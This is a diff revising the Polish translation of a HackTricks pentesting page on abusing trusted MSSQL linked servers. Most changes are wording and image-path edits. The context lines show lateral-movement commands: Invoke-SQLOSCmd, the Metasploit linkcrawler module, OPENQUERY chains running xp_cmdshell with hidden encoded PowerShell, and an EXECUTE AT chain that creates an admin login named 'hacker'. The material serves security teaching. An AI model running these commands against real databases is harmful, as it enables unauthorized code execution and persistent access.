@@ -4,7 +4,7 @@
 
 <summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -86,7 +86,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 Jeśli instancja MSSQL jest zaufana (łącze bazy danych) przez inną instancję MSSQL. Jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **wykorzystać relację zaufania do wykonywania zapytań również w innej instancji**. Te zaufania mogą być łańcuchowane, a w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, w której może wykonywać polecenia.
 
-**Łącza między bazami danych działają nawet w przypadku zaufań między lasami.**
+**Łącza między bazami danych działają nawet w przypadku zaufania między lasami.**
 
 ### Nadużycie Powershell
 ```powershell
@@ -130,20 +130,20 @@ msf> use exploit/windows/mssql/mssql_linkcrawler
 ```
 ### Ręcznie - Openquery()
 
-Z systemu **Linux** możesz uzyskać konsolę powłoki MSSQL za pomocą **sqsh** i **mssqlclient.py.**
+Z systemu **Linux** możesz uzyskać konsolę powłoki MSSQL za pomocą **sqsh** i **mssqlclient.py**.
 
-Z systemu **Windows** możesz również znaleźć linki i wykonywać polecenia ręcznie, korzystając z klienta MSSQL, takiego jak [**HeidiSQL**](https://www.heidisql.com)
+Z systemu **Windows** możesz również znaleźć linki i wykonywać polecenia ręcznie za pomocą klienta MSSQL, takiego jak [**HeidiSQL**](https://www.heidisql.com)
 
-_Zaloguj się, korzystając z uwierzytelniania systemu Windows:_
+_Zaloguj się przy użyciu uwierzytelnienia systemu Windows:_
 
-![](<../../.gitbook/assets/image (805).png>) 
+![](<../../.gitbook/assets/image (808).png>) 
 
 #### Znajdź godne zaufania linki
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../.gitbook/assets/image (713).png>)
+![](<../../.gitbook/assets/image (716).png>)
 
 #### Wykonaj zapytania w zaufanym linku
 
@@ -155,9 +155,9 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 Sprawdź, gdzie używane są cudzysłowy podwójne i pojedyncze, ważne jest, aby używać ich w ten sposób.
 {% endhint %}
 
-![](<../../.gitbook/assets/image (640).png>)
+![](<../../.gitbook/assets/image (643).png>)
 
-Możesz kontynuować tę zaufaną łańcuchową linków w nieskończoność ręcznie.
+Możesz kontynuować tę zaufaną łańcuchową listę linków w nieskończoność ręcznie.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -167,7 +167,7 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 ```
 ### Instrukcja - EXECUTE
 
-Możesz także nadużywać zaufanych łączy za pomocą metody `EXECUTE`:
+Możesz także nadużyć zaufanych łączy za pomocą `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -189,10 +189,10 @@ Strategią, którą wielu autorów wymyśliło, jest zmuszenie usługi SYSTEM do
 
 <summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
